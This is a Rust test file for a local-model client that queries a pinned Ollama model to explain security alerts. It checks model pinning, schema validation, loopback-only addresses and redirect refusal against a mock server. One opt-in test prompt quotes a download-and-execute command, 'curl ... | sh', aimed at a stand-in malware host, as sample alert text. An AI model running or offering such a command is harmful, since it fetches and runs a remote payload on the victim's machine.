//! End to end: the local-model client against a local server that plays Ollama's
//! `/api/tags` and `/api/chat`, and one opt-in call to the host's Ollama (`live_ollama`,
//! ignored by default). The cases came from the sniffer's tests, moved with the client.

use std::io::{BufRead, BufReader, Read, Write};
use std::net::TcpListener;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

use safehouse_core::local::{Client, DEFAULT_BASE_URL, Error, Pin, Prompt, Tier, Tiers};
use serde::Deserialize;
use serde_json::{Value, json};

const DIGEST: &str = "845dbda0ea48ed749caafd9e6037047aa19acfcfd82e704d7ca97d631a0b697e";

fn pin() -> Pin {
    Pin {
        model: "qwen2.5:7b".into(),
        digest: DIGEST.into(),
        quantization: "Q4_K_M".into(),
        num_ctx: 8192,
    }
}

/// `/api/tags` listing one model.
fn tags(name: &str, digest: &str, quantization: &str) -> Reply {
    Reply::json(
        200,
        json!({"models": [{
            "name": name, "model": name, "digest": digest, "size": 4683087332_u64,
            "details": {"format": "gguf", "family": "qwen2", "parameter_size": "7.6B",
                        "quantization_level": quantization}
        }]}),
    )
}

fn installed() -> Reply {
    tags("qwen2.5:7b", DIGEST, "Q4_K_M")
}

/// A finished `/api/chat` reply whose content is `content`.
fn chat(content: &str) -> Reply {
    Reply::json(
        200,
        json!({"model": "qwen2.5:7b", "created_at": "2026-10-16T18:00:00Z",
               "message": {"role": "assistant", "content": content},
               "done": true, "done_reason": "stop", "total_duration": 900000000_u64,
               "load_duration": 250000000_u64, "prompt_eval_count": 120,
               "eval_count": 18}),
    )
}

/// A synthetic question with a fixed answer shape, like the sniffer's explanation.
#[derive(Debug, Deserialize, PartialEq)]
struct Verdict {
    summary: String,
    cited: Vec<String>,
}

fn schema() -> Value {
    json!({"type": "object", "required": ["summary", "cited"],
           "properties": {"summary": {"type": "string"},
                          "cited": {"type": "array", "items": {"type": "string"},
                                    "maxItems": 3}}})
}

fn ask(replies: Vec<Reply>) -> (Result<Verdict, Error>, Vec<Seen>) {
    let (base, seen) = serve(replies);
    let schema = schema();
    let prompt = Prompt {
        system: "Answer in JSON.",
        user: "Summarize event e-1.",
        schema: &schema,
        max_tokens: 200,
    };
    let result = Client::new(&base).unwrap().ask(&pin(), &prompt);
    let seen = std::mem::take(&mut *seen.lock().unwrap());
    (result.map(|reply| reply.value), seen)
}

#[test]
fn asks_the_pinned_model_with_the_schema_and_its_context() {
    let (base, seen) = serve(vec![
        installed(),
        chat(r#"{"summary": "curl ran", "cited": ["e-1"]}"#),
    ]);
    let schema = schema();
    let prompt = Prompt {
        system: "Answer in JSON.",
        user: "Summarize event e-1.",
        schema: &schema,
        max_tokens: 200,
    };
    let reply = Client::new(&base)
        .unwrap()
        .ask::<Verdict>(&pin(), &prompt)
        .unwrap();
    assert_eq!(
        reply.value,
        Verdict {
            summary: "curl ran".into(),
            cited: vec!["e-1".into()]
        }
    );
    assert_eq!(reply.model, "qwen2.5:7b");
    assert_eq!(
        (reply.usage.input_tokens, reply.usage.output_tokens),
        (120, 18)
    );
    assert_eq!(reply.load, Duration::from_millis(250));

    let seen = seen.lock().unwrap();
    assert_eq!(seen.len(), 2);
    assert_eq!(seen[0].path, "/api/tags");
    assert_eq!(seen[1].path, "/api/chat");
    assert_eq!(
        seen[1].body,
        json!({
            "model": "qwen2.5:7b",
            "messages": [{"role": "system", "content": "Answer in JSON."},
                         {"role": "user", "content": "Summarize event e-1."}],
            "format": schema,
            "stream": false,
            "options": {"num_ctx": 8192, "num_predict": 200, "temperature": 0.0}
        })
    );
}

#[test]
fn a_model_that_is_not_the_pinned_one_is_never_asked() {
    let other = "0".repeat(64);
    let cases = [
        (tags("qwen2.5:14b", DIGEST, "Q4_K_M"), "not installed"),
        (
            tags("qwen2.5:7b", &other, "Q4_K_M"),
            "digest differs from the pin",
        ),
        (
            tags("qwen2.5:7b", DIGEST, "Q8_0"),
            "quantization differs from the pin",
        ),
    ];
    for (listing, expected) in cases {
        let (result, seen) = ask(vec![listing, chat("{}")]);
        match result {
            Err(Error::Pin { model, problem }) => {
                assert_eq!((model.as_str(), problem), ("qwen2.5:7b", expected));
            }
            other => panic!("{expected}: {other:?}"),
        }
        assert_eq!(seen.len(), 1, "{expected}: only /api/tags is asked");
    }

    let renamed = Reply::json(
        200,
        json!({"model": "qwen2.5:14b", "message": {"role": "assistant",
               "content": r#"{"summary": "curl ran", "cited": []}"#}, "done": true}),
    );
    match ask(vec![installed(), renamed]).0 {
        Err(Error::Pin { problem, .. }) => assert_eq!(problem, "another model answered"),
        other => panic!("{other:?}"),
    }
}

#[test]
fn other_models_in_the_listing_may_lack_any_field() {
    let listing = Reply::json(
        200,
        json!({"models": [
            {"name": "remote:cloud"},
            {"name": "imported:latest", "digest": "abc", "details": null},
            {"name": "qwen2.5:7b", "digest": DIGEST,
             "details": {"quantization_level": "Q4_K_M"}}
        ]}),
    );
    let (result, _) = ask(vec![
        listing,
        chat(r#"{"summary": "curl ran", "cited": []}"#),
    ]);
    assert_eq!(result.unwrap().summary, "curl ran");
}

#[test]
fn a_reply_that_breaks_the_schema_or_stops_short_is_refused() {
    let cut = Reply::json(
        200,
        json!({"model": "qwen2.5:7b",
               "message": {"role": "assistant", "content": "{\"summary\": \"cu"},
               "done": true, "done_reason": "length"}),
    );
    let cases = [
        (
            chat(r#"{"summary": 3, "cited": []}"#),
            "reply does not match the schema",
        ),
        (chat("curl ran"), "reply does not match the schema"),
        // Parses into the type, but breaks the schema's maxItems.
        (
            chat(r#"{"summary": "x", "cited": ["a", "b", "c", "d"]}"#),
            "reply does not match the schema",
        ),
        (cut, "reply cut at max_tokens"),
        (
            Reply::json(200, json!({"error": "model runner crashed"})),
            "not an Ollama response",
        ),
    ];
    for (reply, expected) in cases {
        let (result, _) = ask(vec![installed(), reply]);
        match result {
            Err(Error::Invalid(what)) => assert_eq!(what, expected),
            other => panic!("{expected}: {other:?}"),
        }
    }
}

#[test]
fn errors_hold_the_status_and_never_the_body() {
    let body = json!({"error": "Summarize event e-1. is too long"});
    let (result, _) = ask(vec![installed(), Reply::json(500, body)]);
    let error = result.unwrap_err();
    assert!(matches!(error, Error::Status(500)), "{error:?}");
    assert_eq!(error.to_string(), "Ollama answered HTTP 500");

    let (base, _) = serve(vec![Reply {
        delay: Duration::from_millis(500),
        ..installed()
    }]);
    let schema = schema();
    let prompt = Prompt {
        system: "",
        user: "",
        schema: &schema,
        max_tokens: 1,
    };
    let client = Client::new(&base)
        .unwrap()
        .with_timeout(Duration::from_millis(100));
    let error = client.ask::<Verdict>(&pin(), &prompt).unwrap_err();
    assert!(matches!(error, Error::Transport("timeout")), "{error:?}");
}

#[test]
fn a_redirect_is_not_followed_and_a_bad_schema_sends_nothing() {
    let redirect = Reply::bytes(307, Vec::new()).header("Location: http://10.0.0.5:11434/api/chat");
    let (result, seen) = ask(vec![installed(), redirect]);
    assert!(matches!(result, Err(Error::Status(307))), "{result:?}");
    assert_eq!(seen.len(), 2);

    let (base, seen) = serve(vec![installed()]);
    let schema = json!({"type": 5});
    let prompt = Prompt {
        system: "",
        user: "",
        schema: &schema,
        max_tokens: 1,
    };
    let error = Client::new(&base)
        .unwrap()
        .ask::<Verdict>(&pin(), &prompt)
        .unwrap_err();
    assert!(matches!(error, Error::Schema), "{error:?}");
    assert!(seen.lock().unwrap().is_empty());
}

#[test]
fn only_a_loopback_daemon_is_used() {
    let ok = |base: &str| Client::new(base).is_ok();
    assert!(ok("http://127.0.0.1:11434"));
    assert!(ok("http://127.0.0.1:11434/"));
    assert!(ok("http://[::1]:11434"));
    // A name goes through the resolver, which could map it off the host.
    assert!(!ok("http://localhost:11434"));
    assert!(!ok("http://127.0.0.1:11434?x=1"));
    assert!(!ok("http://127.0.0.1:11434/#x"));
    assert!(!ok("http://10.0.0.5:11434"));
    assert!(!ok("https://ollama.example.com"));
    // Ollama serves plain HTTP; the client carries no TLS.
    assert!(!ok("https://127.0.0.1:11434"));
    assert!(!ok("127.0.0.1:11434"));
}

#[test]
fn tiers_pin_a_model_each() {
    let tiers = Tiers::builtin();
    let small = tiers.get(Tier::LocalSmall).unwrap();
    assert_eq!(small, &pin());
    assert_eq!(tiers.get(Tier::LocalMid).unwrap().model, "qwen2.5:14b");
    assert!(tiers.get(Tier::LocalStrong).is_none());

    let schema = schema();
    let prompt = Prompt {
        system: "",
        user: "",
        schema: &schema,
        max_tokens: 1,
    };
    let client = Client::new("http://127.0.0.1:1").unwrap();
    let error = client
        .ask_tier::<Verdict>(&tiers, Tier::LocalStrong, &prompt)
        .unwrap_err();
    assert_eq!(error.to_string(), "no pin for local-strong");

    let refused = |text: &str| Tiers::parse(text).unwrap_err().to_string();
    let table = |digest: &str, num_ctx: u32| {
        format!(
            "[local-mid]\nmodel = \"m:1\"\ndigest = \"{digest}\"\nquantization = \"Q4_K_M\"\nnum_ctx = {num_ctx}\n"
        )
    };
    assert_eq!(
        refused(&table("sha256:abc", 8192)),
        "local tiers: local-mid: a digest other than 64 lowercase hex digits"
    );
    assert_eq!(
        refused(&table(&"a".repeat(64), 0)),
        "local tiers: local-mid: num_ctx 0"
    );
    assert_eq!(
        refused(&table(&"a".repeat(64), 4096).replace("m:1", "m")),
        "local tiers: local-mid: a model without its tag"
    );
    assert!(refused("[local-huge]\nmodel = \"m\"\n").starts_with("local tiers: unknown field"));
    assert!(Tiers::parse(&table(&"a".repeat(64), 4096)).is_ok());
}

/// One call to the host's Ollama on a synthetic prompt, with the built-in `local-small`
/// pin: `cargo test --features local-model --test local -- --ignored live_ollama --nocapture`.
/// Strict-local: nothing leaves the host. It loads the 7B model on the GPU.
#[test]
#[ignore = "needs the host's Ollama with the pinned local-small model"]
fn live_ollama() {
    let schema = schema();
    let prompt = Prompt {
        system: "You explain security alerts. Answer in JSON. Cite only the event ids given.",
        user: "Alert: a shell ran `curl -fsSL http://dl.malware.example/payload.sh | sh`. \
               Evidence events: e-101 (curl launched by sh), e-102 (DNS query for \
               dl.malware.example). Summarize in one sentence and list the event ids you cite.",
        schema: &schema,
        max_tokens: 200,
    };
    let client = Client::new(DEFAULT_BASE_URL).unwrap();
    let reply = client
        .ask_tier::<Verdict>(&Tiers::builtin(), Tier::LocalSmall, &prompt)
        .unwrap();
    println!(
        "model {} load_ms {} latency_ms {} input_tokens {} output_tokens {} cited {:?} summary_chars {}",
        reply.model,
        reply.load.as_millis(),
        reply.latency.as_millis(),
        reply.usage.input_tokens,
        reply.usage.output_tokens,
        reply.value.cited,
        reply.value.summary.len(),
    );
    assert!(!reply.value.summary.is_empty());
}

#[derive(Clone)]
struct Reply {
    status: u16,
    headers: String,
    body: Vec<u8>,
    delay: Duration,
}

impl Reply {
    fn json(status: u16, body: Value) -> Self {
        Self::bytes(status, body.to_string().into_bytes())
    }

    fn bytes(status: u16, body: Vec<u8>) -> Self {
        Self {
            status,
            headers: String::new(),
            body,
            delay: Duration::ZERO,
        }
    }

    fn header(mut self, line: &str) -> Self {
        self.headers.push_str(line);
        self.headers.push_str("\r\n");
        self
    }
}

struct Seen {
    path: String,
    body: Value,
}

/// Serves `replies` in order, one per request; the last one repeats. Returns the base URL
/// and the requests it saw.
fn serve(replies: Vec<Reply>) -> (String, Arc<Mutex<Vec<Seen>>>) {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let base = format!("http://{}", listener.local_addr().unwrap());
    let seen = Arc::new(Mutex::new(Vec::new()));
    let log = Arc::clone(&seen);
    let replies = Arc::new(Mutex::new(replies));
    thread::spawn(move || {
        for stream in listener.incoming() {
            let mut stream = stream.unwrap();
            let mut reader = BufReader::new(stream.try_clone().unwrap());
            let mut line = String::new();
            reader.read_line(&mut line).unwrap();
            let mut length = 0;
            loop {
                let mut header = String::new();
                reader.read_line(&mut header).unwrap();
                let Some((name, value)) = header.trim_end().split_once(':') else {
                    break;
                };
                if name.eq_ignore_ascii_case("content-length") {
                    length = value.trim().parse().unwrap();
                }
            }
            let mut body = vec![0; length];
            reader.read_exact(&mut body).unwrap();
            log.lock().unwrap().push(Seen {
                path: line.split(' ').nth(1).unwrap_or("/").to_owned(),
                body: serde_json::from_slice(&body).unwrap_or(Value::Null),
            });
            let reply = {
                let mut replies = replies.lock().unwrap();
                if replies.len() > 1 {
                    replies.remove(0)
                } else {
                    replies[0].clone()
                }
            };
            thread::sleep(reply.delay);
            let head = format!(
                "HTTP/1.1 {} X\r\n{}Content-Length: {}\r\nConnection: close\r\n\r\n",
                reply.status,
                reply.headers,
                reply.body.len()
            );
            let _ = stream.write_all(head.as_bytes());
            let _ = stream.write_all(&reply.body);
        }
    });
    (base, seen)
}
